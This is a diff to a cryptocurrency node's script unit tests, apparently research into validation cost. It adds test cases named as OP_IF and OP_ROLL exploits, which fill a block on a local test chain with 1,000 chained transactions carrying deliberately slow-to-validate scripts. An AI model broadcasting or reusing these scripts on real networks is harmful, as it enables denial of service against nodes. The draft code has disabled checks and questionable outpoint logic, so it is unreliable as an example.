@@ -1494,112 +1494,124 @@ BOOST_AUTO_TEST_CASE(script_FindAndDelete)
     BOOST_CHECK(s == expect);
 }
 
-// emd new
-//BOOST_AUTO_TEST_CASE(script_FullBlockOfSlowScripts, TestChain100Setup)
-BOOST_FIXTURE_TEST_CASE(script_FullBlockOfSlowScripts, TestChain100Setup)
+//BOOST_AUTO_TEST_CASE(script_FullBlockOfSlowScripts)
+BOOST_FIXTURE_TEST_CASE(script_OpIfExploit, TestChain100Setup)
 {
     ScriptError err;
-    
+
     std::cout << "Using custom entry point..." << std::endl;
 
-    /******************************************
-    * construct a block and fill it with tx's
-    * containing long-running scripts 
-    ******************************************/
-
-    /* emd This creates the scriptPubKey which I believe will be what signs for the transaction.
-    So, this CScript is one place we can add an "inefficient transaction"  */
-    CScript scriptPubKey = CScript() << ToByteVector(coinbaseKey.GetPubKey()) << OP_CHECKSIG;
-
-/* emd I don't really know what this is doing (a bitwise OR between
-   SIGHASH_ALL and SIGHASH_FORKID but what is the significance?)
-   but it looks like its being used downstream so im gonna leave it here
-   for now
-*/
     unsigned int sighashType = SIGHASH_ALL;
- //   if (chainActive.Tip()->IsforkActiveOnNextBlock(miningForkTime.value))
-        sighashType |= SIGHASH_FORKID;
+    // emd This line throws an error that chainActive is not declared
+    //  I think this compiles in BOOST_AUTO_TEST_CASE intead of
+    //  BOOST_FIXTURE_TEST_CASE but I had to use Fixture so I could
+    //  get the testchain setup
+    //if (chainActive.Tip()->IsforkActiveOnNextBlock(miningForkTime.value))
+    //sighashType |= SIGHASH_FORKID;
 
-/* emd Make the bad script */
+   /* Make the attack script */
     CScript quad_test_script;
     quad_test_script << OP_0;
-    int depth=1000;
+    int depth=100;
     CScript res_stack;
-     BOOST_CHECK(
-         //VerifyScript(res_stack,quad_test_script, SCRIPT_VERIFY_P2SH, BaseSignatureChecker(), &err)
-1==1
-         );
-
-     VerifyScript(res_stack,quad_test_script, SCRIPT_VERIFY_P2SH, BaseSignatureChecker(), &err);
 
     for(int i=0; i<(depth); ++i)
-    {
         quad_test_script << OP_IF ;
-    }
+
     for(int i = 0; i<9798; ++i)
-    {
         quad_test_script << OP_0;
-    }
+
     for(int i=0; i<depth; ++i)
-    {
         quad_test_script << OP_ENDIF ;
-    }
+
     quad_test_script << OP_1;
 
-
-    // Create txns with slow scripts:
+    // Create chain of txns with slow scripts:
     std::vector<CMutableTransaction> txns;
+    CMutableTransaction prevtx = coinbaseTxns[0];
     txns.resize(1000);
+    uint256 last_hash = coinbaseTxns[0].GetHash(); //initialize with coinbase
+    // emd how do I print this hash?
+    //std::cout << "L h " << (unsigned char)last_hash << endl;
     for (int i = 0; i < 1000; i++)
     {
         txns[i].vin.resize(1);
-        txns[i].vin[0].prevout.hash = coinbaseTxns[0].GetHash();
-        txns[i].vin[0].prevout.n = 0;
+        txns[i].vin[0].prevout = COutPoint(prevtx.GetHash(),prevtx.vin[0].prevout.n);
         txns[i].vout.resize(1);
         txns[i].vout[0].nValue = 11 * CENT;
         txns[i].vout[0].scriptPubKey = quad_test_script;
 
        // Sign:
         std::vector<unsigned char> vchSig;
-        uint256 hash = SignatureHash(scriptPubKey, txns[i], 0, sighashType, coinbaseTxns[0].vout[0].nValue, 0);
-        //BOOST_CHECK(coinbaseKey.Sign(hash, vchSig));
+        //uint256 hash = SignatureHash(coinbaseTxns[0].vout[0].scriptPubKey, txns[i], 0, sighashType, coinbaseTxns[0].vout[0].nValue, 0);
+        uint256 hash = SignatureHash(prevtx.vout[0].scriptPubKey, txns[i], 0, sighashType, prevtx.vout[0].nValue, 0);
+        coinbaseKey.Sign(hash, vchSig);
         vchSig.push_back((unsigned char)sighashType);
         txns[i].vin[0].scriptSig << vchSig;
+        //txns[i].vin[0].scriptSig = quad_test_script;
+
+        //Save Tx to ref next loop
+        prevtx = txns[i];
     }
-
-
-    /* emd Add txns to block and process. Below is an unverified example
-       I copied. Need to check/finish if this is really what I want to do 
-       in order to ultimately time the validation of the block full of 
-       expensive scripts */
     CBlock block;
     block = CreateAndProcessBlock(txns, quad_test_script);
-   // BOOST_CHECK(CreateAndProcessBlock(txns, quad_test_script) == true);
-    //BOOST_CHECK(chainActive.Tip()->GetBlockHash() != block.GetHash());
-
-
-
-/* emd everything from here to the end of the function attempts to create
-   a single script and time it's validation or evaluation This code should more or less
-   make it's way to the for loop above */
-
-/* Taking this out for now until I can get a block built and validated
-
-    BOOST_CHECK_MESSAGE(
-        VerifyScript(res_stack, quad_test, SCRIPT_VERIFY_P2SH, BaseSignatureChecker(), &err),
-      "VerifyScript base msg.");
-    BOOST_CHECK_MESSAGE(err == SCRIPT_ERR_OK, ScriptErrorString(err));
-    
-    BOOST_CHECK_MESSAGE(
-        EvalScript(resultStack, quad_test, SCRIPT_VERIFY_P2SH, BaseSignatureChecker(), &err),
-      "EvalScript base msg.");
-    BOOST_CHECK_MESSAGE(err == SCRIPT_ERR_OK, ScriptErrorString(err));
-    
-    std::cout << "Res is " << resultStack[1][0] << endl;
-
-*/
-    
+    //BOOST_CHECK(CreateAndProcessBlock(txns, quad_test_script) == true);
 }
 
+BOOST_FIXTURE_TEST_CASE(script_OpRollExploit, TestChain100Setup)
+{
+    ScriptError err;
+
+    std::cout << "Using custom entry point..." << std::endl;
+
+    unsigned int sighashType = SIGHASH_ALL;
+    // emd This line throws an error that chainActive is not declared
+    //  I think this compiles in BOOST_AUTO_TEST_CASE intead of
+    //  BOOST_FIXTURE_TEST_CASE but I had to use Fixture so I could
+    //  get the testchain setup
+    //if (chainActive.Tip()->IsforkActiveOnNextBlock(miningForkTime.value))
+    //sighashType |= SIGHASH_FORKID;
+
+   /* Make the attack script */
+    CScript quad_test_script;
+    CScript res_stack;
+
+    for(int i = 0; i<1000; ++i)
+        quad_test_script << OP_1;
+
+    for(int i=0; i<201; ++i)
+        quad_test_script << OP_ROLL;
+
+    // Create chain of txns with slow scripts:
+    std::vector<CMutableTransaction> txns;
+    CMutableTransaction prevtx = coinbaseTxns[0];
+    txns.resize(1000);
+    uint256 last_hash = coinbaseTxns[0].GetHash(); //initialize with coinbase
+    // emd how do I print this hash?
+    //std::cout << "L h " << (unsigned char)last_hash << endl;
+    for (int i = 0; i < 1000; i++)
+    {
+        txns[i].vin.resize(1);
+        txns[i].vin[0].prevout = COutPoint(prevtx.GetHash(),prevtx.vin[0].prevout.n);
+        txns[i].vout.resize(1);
+        txns[i].vout[0].nValue = 11 * CENT;
+        txns[i].vout[0].scriptPubKey = quad_test_script;
+
+       // Sign:
+        std::vector<unsigned char> vchSig;
+        //uint256 hash = SignatureHash(coinbaseTxns[0].vout[0].scriptPubKey, txns[i], 0, sighashType, coinbaseTxns[0].vout[0].nValue, 0);
+        uint256 hash = SignatureHash(prevtx.vout[0].scriptPubKey, txns[i], 0, sighashType, prevtx.vout[0].nValue, 0);
+        coinbaseKey.Sign(hash, vchSig);
+        vchSig.push_back((unsigned char)sighashType);
+        txns[i].vin[0].scriptSig << vchSig;
+        //txns[i].vin[0].scriptSig = quad_test_script;
+
+        //Save Tx to ref next loop
+        prevtx = txns[i];
+    }
+    CBlock block;
+    block = CreateAndProcessBlock(txns, quad_test_script);
+    //BOOST_CHECK(CreateAndProcessBlock(txns, quad_test_script) == true);
+}
 
 BOOST_AUTO_TEST_SUITE_END()
